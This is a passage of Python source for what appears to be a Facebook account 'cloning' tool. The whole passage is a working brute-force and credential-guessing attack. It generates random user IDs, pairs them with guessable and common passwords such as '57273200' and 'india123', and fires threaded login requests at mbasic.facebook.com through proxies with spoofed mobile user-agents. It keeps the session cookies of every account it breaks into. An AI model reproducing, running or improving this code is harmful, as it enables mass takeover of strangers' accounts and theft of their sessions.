...
try:
 ff= requests.get('https://raw.githubusercontent.com/mdtasin123/SERVER/main/file-ua.txt').text
 open('.ff.txt','w').write(prd)
except Exception as e:
 print('')
ff=open('.ff.txt','r').read().splitlines()
...
def Srx():
	...
	print(f'   {B}|{G}04{B}|{W} Random Cloning Bangladesh ')
	print(f'   {B}|{G}05{B}|{W} Gmail Cloning ')
	print(f'   {B}|{G}05{B}|{W} xvoy_tast ')
	lin()
	...
	if me in ["1", "01","11","A","a"]:
		...
		with ThreadPool(max_workers=30) as crack_submit:
			...
			for user in fo:
				...
				passlist = plist
				if mthod in ['1','01']:
					crack_submit.submit(rnapi6(ids,passlist))
				if mthod in ['2','02']:
					crack_submit.submit(rnapi8(ids,passlist))
def india():
	user=[]
	clr()
	lin()
	...
	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M5 {B}|{W}')
	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M6 {B}|{W}')
	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M7 {B}|{W}')
	lin()
	mthod = input(f'   {B}|{G}★{B}|{W} Choice {R}:{G} ')
	clr()
	lin()
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			if mthod in ['5','05']:
				yaari.submit(rcrack5,uid,pwx,tl)
			if mthod in ['6','06']:
				yaari.submit(rcrack6,uid,pwx,tl)
			if mthod in ['7','07']:
				yaari.submit(rcrack7,uid,pwx,tl)
			if mthod in ['8','08']:
				yaari.submit(indaapi(uid,pwx,tl))
			else:
				yaari.submit(rcrack1,uid,pwx,tl)
def bd():
	user=[]
...
def rcrack5(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			#pro = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
			session = requests.Session()
			sys.stdout.write(f'\r   {B}|{G}M5{B}|{W}[{G}SRX-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
			sys.stdout.flush()
			free_fb = session.get('https://mbasic.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			...
			'content-length', '419'
			'x-fb-lsd', 'AVofAy1MZUs'
			'origin', 'https://mbasic.facebook.com'
			'content-type', 'application/x-www-form-urlencoded'
			'x-requested-with', 'XMLHttpRequest'
			'sec-ch-ua-platform', '"Android"'
			'referer', 'https://mbasic.facebook.com/v2.10/dialog/oauth?app_id=89186614300&cbt=1710457068929&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df7c03db9f7714f12d%26domain%3Dwww.etsy.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.etsy.com%252Ff690932b260b856d1%26relation%3Dopener&client_id=89186614300&display=popup&domain=www.etsy.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.etsy.com%2F&locale=en_US&logger_id=f27779b96b774b30b&origin=1&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ea0f5e42a92c8d5%26domain%3Dwww.etsy.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.etsy.com%252Ff690932b260b856d1%26relation%3Dopener%26frame%3Dff3f15585441eecc0&response_type=token%2Csigned_request%2Cgraph_domain&scope=email&sdk=joey&version=v2.10&ret=login&fbapp_pres=0&tp=unspecified'
			'user-agent', pro}
			#print(log_data)
			#print(header_freefb)
			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb, proxy=proxs).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = user_id(coki)
...
def rcrack6(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			#pro = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
			session = requests.Session()
			sys.stdout.write(f'\r   {B}|{G}M6{B}|{W}[{G}SRX-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
			sys.stdout.flush()
			free_fb = session.get('https://mbasic.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			...
			'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryhIFaEWsdQKCqmtmP',
			'dpr': '2.55',
			'origin': 'https://mbasic.facebook.com',
			'referer': 'https://mbasic.facebook.com/',
			'sec-ch-prefers-color-scheme': 'light',
...
def rcrack7(uid,pwx,tl):
	...
	try:
		...
		rcrack7(uid,pwx,tl)
def indaapi(uid,pwx,tl):
		global loop
		global cps
		global oks
		global prox
		sys.stdout.write('\r\r\033[1;37m   [India API] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		try:
				for ps in pwx:
...
def rndmpi():
		...
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with ThreadPool(max_workers=20) as SPYC:	
			clr()
			tl = str(len(user))
			lin()
			print(f'   {B}|{G}★{B}|{W} Total Ids   {R}:{G} {tl}')
			...
			for psx in user:
				...
				if plst in ['1','01']:
					#passlist = [code[4:]+psx]
					passlist = [code+psx[:2],'57273200']
				elif plst in ['2','02']:
					passlist = [code+psx[:2],'57273200','07860786','59039200']
				else:
					passlist = [code+psx[:2],code+psx[:4],'07860786','57273200','59039200','57575751','57575752','5903900','india123',code+psx,psx]
				if mthd in ['1','01']:
